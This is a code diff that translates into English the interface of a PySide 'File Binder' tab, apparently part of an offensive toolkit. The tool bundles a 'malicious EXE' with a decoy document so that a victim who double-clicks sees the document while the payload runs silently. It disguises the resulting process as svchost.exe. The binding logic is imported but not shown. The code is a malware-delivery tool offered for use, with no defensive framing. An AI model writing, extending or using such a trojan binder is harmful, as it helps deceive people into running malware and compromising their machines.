@@ -10,7 +10,7 @@ from generators.binder_generator import generate_binder_exe, generate_stub_only
 
 
 class BuildThread(QThread):
-    """后台编译线程，避免 PyInstaller 编译时阻塞 GUI"""
+    """Background build thread to avoid blocking the GUI during PyInstaller compilation"""
     finished = Signal(bool, str)
 
     def __init__(self, payload_path, decoy_path, output_filename,
@@ -52,50 +52,51 @@ class BinderTab(QWidget):
         content_layout.setContentsMargins(20, 20, 20, 20)
         content_layout.setSpacing(12)
 
-        # 标题
-        title = QLabel("文件捆绑器")
+        # Title
+        title = QLabel("File Binder")
         title.setObjectName("titleLabel")
         content_layout.addWidget(title)
 
         subtitle = QLabel(
-            "将 Payload EXE 与诱饵文档捆绑为单个 EXE。"
-            "目标双击后，后台静默运行 Payload，前台自动打开正常文档作为掩护。"
-            "最终交付物是一个独立的 EXE 文件。"
+            "Bundle a payload EXE with a decoy document into a single EXE. "
+            "When the target double-clicks, the payload runs silently in the background "
+            "while a normal document opens in the foreground as cover. "
+            "The final deliverable is a standalone EXE file."
         )
         subtitle.setObjectName("subtitleLabel")
         subtitle.setWordWrap(True)
         content_layout.addWidget(subtitle)
 
-        # --- 文件选择 ---
-        file_group = QGroupBox("文件选择")
+        # --- File Selection ---
+        file_group = QGroupBox("File Selection")
         file_layout = QVBoxLayout()
 
         payload_row = QHBoxLayout()
         payload_row.addWidget(QLabel("Payload EXE:"))
         self.payload_input = QLineEdit()
-        self.payload_input.setPlaceholderText("选择要捆绑的恶意 EXE 程序")
+        self.payload_input.setPlaceholderText("Select the malicious EXE to bundle")
         payload_row.addWidget(self.payload_input, 1)
-        self.payload_btn = QPushButton("浏览")
+        self.payload_btn = QPushButton("Browse")
         self.payload_btn.clicked.connect(self.select_payload)
         payload_row.addWidget(self.payload_btn)
         file_layout.addLayout(payload_row)
 
         decoy_row = QHBoxLayout()
-        decoy_row.addWidget(QLabel("诱饵文档:"))
+        decoy_row.addWidget(QLabel("Decoy Document:"))
         self.decoy_input = QLineEdit()
-        self.decoy_input.setPlaceholderText("选择掩护用的正常文档（PDF/Word/Excel/图片等）")
+        self.decoy_input.setPlaceholderText("Select a legitimate document for cover (PDF/Word/Excel/Image)")
         decoy_row.addWidget(self.decoy_input, 1)
-        self.decoy_btn = QPushButton("浏览")
+        self.decoy_btn = QPushButton("Browse")
         self.decoy_btn.clicked.connect(self.select_decoy)
         decoy_row.addWidget(self.decoy_btn)
         file_layout.addLayout(decoy_row)
 
         icon_row = QHBoxLayout()
-        icon_row.addWidget(QLabel("EXE 图标:"))
+        icon_row.addWidget(QLabel("EXE Icon:"))
         self.icon_input = QLineEdit()
-        self.icon_input.setPlaceholderText("可选：自定义图标文件（.ico），不选则使用默认图标")
+        self.icon_input.setPlaceholderText("Optional: custom icon file (.ico). Uses default if empty.")
         icon_row.addWidget(self.icon_input, 1)
-        self.icon_btn = QPushButton("浏览")
+        self.icon_btn = QPushButton("Browse")
         self.icon_btn.clicked.connect(self.select_icon)
         icon_row.addWidget(self.icon_btn)
         file_layout.addLayout(icon_row)
@@ -103,30 +104,30 @@ class BinderTab(QWidget):
         file_group.setLayout(file_layout)
         content_layout.addWidget(file_group)
 
-        # --- 输出设置 ---
-        settings_group = QGroupBox("输出设置")
+        # --- Output Settings ---
+        settings_group = QGroupBox("Output Settings")
         settings_layout = QVBoxLayout()
 
         mode_row = QHBoxLayout()
-        mode_row.addWidget(QLabel("生成模式:"))
+        mode_row.addWidget(QLabel("Build Mode:"))
         self.mode_selector = QComboBox()
         self.mode_selector.addItems([
-            "编译为 EXE（需要 PyInstaller）",
-            "仅生成 Stub 脚本（手动编译）"
+            "Compile to EXE (requires PyInstaller)",
+            "Generate Stub Script Only (manual build)"
         ])
         mode_row.addWidget(self.mode_selector, 1)
         settings_layout.addLayout(mode_row)
 
         name_row = QHBoxLayout()
-        name_row.addWidget(QLabel("进程伪装名:"))
+        name_row.addWidget(QLabel("Process Name:"))
         self.run_name_input = QLineEdit()
-        self.run_name_input.setPlaceholderText("Payload 释放后的进程名（伪装为系统进程）")
+        self.run_name_input.setPlaceholderText("Process name after payload extraction (disguised as system process)")
         self.run_name_input.setText("svchost.exe")
         name_row.addWidget(self.run_name_input, 1)
         settings_layout.addLayout(name_row)
 
         output_row = QHBoxLayout()
-        output_row.addWidget(QLabel("输出文件名:"))
+        output_row.addWidget(QLabel("Output Filename:"))
         self.output_input = QLineEdit()
         self.output_input.setText("demo.exe")
         output_row.addWidget(self.output_input, 1)
@@ -135,12 +136,12 @@ class BinderTab(QWidget):
         settings_group.setLayout(settings_layout)
         content_layout.addWidget(settings_group)
 
-        # --- 编译进度 ---
-        progress_group = QGroupBox("编译状态")
+        # --- Build Progress ---
+        progress_group = QGroupBox("Build Status")
         progress_layout = QVBoxLayout()
 
         self.progress_bar = QProgressBar()
-        self.progress_bar.setRange(0, 0)  # 不确定进度模式
+        self.progress_bar.setRange(0, 0)  # Indeterminate progress
         self.progress_bar.setVisible(False)
         progress_layout.addWidget(self.progress_bar)
 
@@ -151,8 +152,8 @@ class BinderTab(QWidget):
         progress_group.setLayout(progress_layout)
         content_layout.addWidget(progress_group)
 
-        # --- 输出信息 ---
-        output_group = QGroupBox("输出信息")
+        # --- Output Info ---
+        output_group = QGroupBox("Output")
         output_layout = QVBoxLayout()
         self.output_text = QTextEdit()
         self.output_text.setReadOnly(True)
@@ -168,13 +169,13 @@ class BinderTab(QWidget):
         scroll_area.setWidget(scroll_content)
         main_layout.addWidget(scroll_area, 1)
 
-        # --- 底部 ---
+        # --- Bottom Bar ---
         bottom_bar = QWidget()
         bottom_bar.setObjectName("bottomBar")
         bottom_layout = QHBoxLayout(bottom_bar)
         bottom_layout.setContentsMargins(20, 12, 20, 12)
 
-        self.generate_btn = QPushButton("🚀 生成捆绑 EXE")
+        self.generate_btn = QPushButton("🚀 Generate Bundled EXE")
         self.generate_btn.setObjectName("primaryButton")
         self.generate_btn.setMinimumHeight(40)
         self.generate_btn.setMinimumWidth(160)
@@ -190,24 +191,24 @@ class BinderTab(QWidget):
 
     def select_payload(self):
         path, _ = QFileDialog.getOpenFileName(
-            self, "选择 Payload EXE", "",
-            "可执行文件 (*.exe);;所有文件 (*.*)"
+            self, "Select Payload EXE", "",
+            "Executables (*.exe);;All Files (*.*)"
         )
         if path:
             self.payload_input.setText(path)
 
     def select_decoy(self):
         path, _ = QFileDialog.getOpenFileName(
-            self, "选择诱饵文档", "",
-            "文档文件 (*.pdf *.docx *.doc *.xlsx *.xls *.pptx *.txt *.jpg *.png);;所有文件 (*.*)"
+            self, "Select Decoy Document", "",
+            "Documents (*.pdf *.docx *.doc *.xlsx *.xls *.pptx *.txt *.jpg *.png);;All Files (*.*)"
         )
         if path:
             self.decoy_input.setText(path)
 
     def select_icon(self):
         path, _ = QFileDialog.getOpenFileName(
-            self, "选择图标文件", "",
-            "图标文件 (*.ico);;所有文件 (*.*)"
+            self, "Select Icon File", "",
+            "Icon Files (*.ico);;All Files (*.*)"
         )
         if path:
             self.icon_input.setText(path)
@@ -222,31 +223,31 @@ class BinderTab(QWidget):
 
         if not payload:
             self.status_label.setStyleSheet("color: #e94560; font-weight: bold;")
-            self.status_label.setText("❌ 请选择 Payload EXE 文件")
+            self.status_label.setText("❌ Please select a Payload EXE file")
             return
         if not decoy:
             self.status_label.setStyleSheet("color: #e94560; font-weight: bold;")
-            self.status_label.setText("❌ 请选择诱饵文档")
+            self.status_label.setText("❌ Please select a decoy document")
             return
 
         if mode == 1:
-            # 仅生成 stub 脚本
+            # Generate stub script only
             stub_fn = os.path.splitext(output_fn)[0] + ".py"
             success, message = generate_stub_only(payload, decoy, stub_fn, run_name)
             if success:
                 self.status_label.setStyleSheet("color: #00b894; font-weight: bold;")
-                self.status_label.setText("✅ Stub 脚本生成成功")
+                self.status_label.setText("✅ Stub script generated successfully")
             else:
                 self.status_label.setStyleSheet("color: #e94560; font-weight: bold;")
                 self.status_label.setText(f"❌ {message}")
             self.output_text.setText(message)
             return
 
-        # 编译模式 - 使用后台线程
+        # Compile mode — use background thread
         self.generate_btn.setEnabled(False)
         self.progress_bar.setVisible(True)
-        self.progress_label.setText("正在编译，PyInstaller 打包中，请稍候...")
-        self.status_label.setText("⏳ 编译中...")
+        self.progress_label.setText("Building... PyInstaller is packaging, please wait...")
+        self.status_label.setText("⏳ Building...")
         self.status_label.setStyleSheet("color: #fdcb6e; font-weight: bold;")
 
         self.build_thread = BuildThread(payload, decoy, output_fn, run_name, icon)
@@ -261,7 +262,7 @@ class BinderTab(QWidget):
 
         if success:
             self.status_label.setStyleSheet("color: #00b894; font-weight: bold;")
-            self.status_label.setText("✅ 捆绑 EXE 生成成功")
+            self.status_label.setText("✅ Bundled EXE generated successfully")
         else:
             self.status_label.setStyleSheet("color: #e94560; font-weight: bold;")
-            self.status_label.setText("❌ 生成失败")
+            self.status_label.setText("❌ Generation failed")
